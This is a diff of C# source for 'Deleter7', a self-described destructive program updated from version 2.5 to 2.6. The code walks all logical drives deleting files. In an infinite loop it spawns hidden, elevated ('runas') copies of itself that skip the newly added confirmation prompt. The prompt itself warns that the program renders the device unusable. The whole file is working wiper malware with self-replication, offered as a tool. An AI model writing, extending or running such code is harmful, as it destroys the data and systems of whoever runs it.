@@ -2,26 +2,27 @@ namespace System
 {
     public static class Deleter
     {
-        public const System.String Ver = "2.5";
+        public const System.String Ver = "2.6";
         public const System.String Title = "Deleter7 v" + System.Deleter.Ver;
-        public static System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
-        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
-        public static System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
-        public static System.UInt64 UInt64;
-        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
-        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
-        public static void DeleteDir(System.String[] args)
+        private static readonly System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
+        private static readonly System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
+        private static readonly System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
+        private static System.UInt64 UInt64;
+        private static System.Boolean IsCloned;
+        private static readonly System.String[] Messages = System.Deleter.Argument.Split('\n');
+        private static readonly System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        private static void DeleteDir()
         {
-            System.Console.WriteLine(System.Deleter.Messages);
+            System.Console.Out.WriteLine(System.Deleter.Messages);
             foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
             {
                 if (disk.Name != disk.VolumeLabel)
                 {
-                    System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                    System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                 }
                 else
                 {
-                    System.Console.WriteLine("Current drive is: " + disk.Name);
+                    System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                 }
                 foreach (System.String drive in System.Deleter.LogicalDrives)
                 {
@@ -37,7 +38,7 @@ namespace System
                         foreach (System.String file in files)
                         {
                             System.IO.File.Delete(file);
-                            System.Console.WriteLine("Deleting " + file);
+                            System.Console.Out.WriteLine("Deleting " + file);
                         }
                     }
                 }
@@ -45,13 +46,34 @@ namespace System
         }
         public static void Main(System.String[] args)
         {
-            if (args == null || args.Length == 0)
+            System.String arguments = "";
+            foreach (System.String arg in args)
             {
-                args = System.Deleter.Messages;
+                arguments += arg;
             }
             System.Console.Title = System.Deleter.Title;
             System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
             System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
+            if (arguments.ToLower().Contains("cloned")) 
+            {
+                System.Deleter.IsCloned = true;
+            }
+            else
+            {
+                System.Deleter.IsCloned = false;
+            }
+            if (!System.Deleter.IsCloned)
+            {
+
+                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
+                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
+                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
+                {
+                    System.Environment.Exit(0);
+                    return;
+                }
+            }
             System.Threading.Thread.Sleep(1000);
             while (true)
             {
@@ -62,12 +84,12 @@ namespace System
                 p.StartInfo.Verb = "runas";
                 p.StartInfo.FileName = System.Deleter.ProgramName
                     + " (" + System.Deleter.UInt64 + ").exe";
-                p.StartInfo.Arguments = System.Deleter.Argument;
+                p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                 p.StartInfo.CreateNoWindow = true;
                 p.StartInfo.RedirectStandardOutput = true;
                 p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                 p.Start();
-                System.Deleter.DeleteDir(args);
+                System.Deleter.DeleteDir();
             }
         }
     }
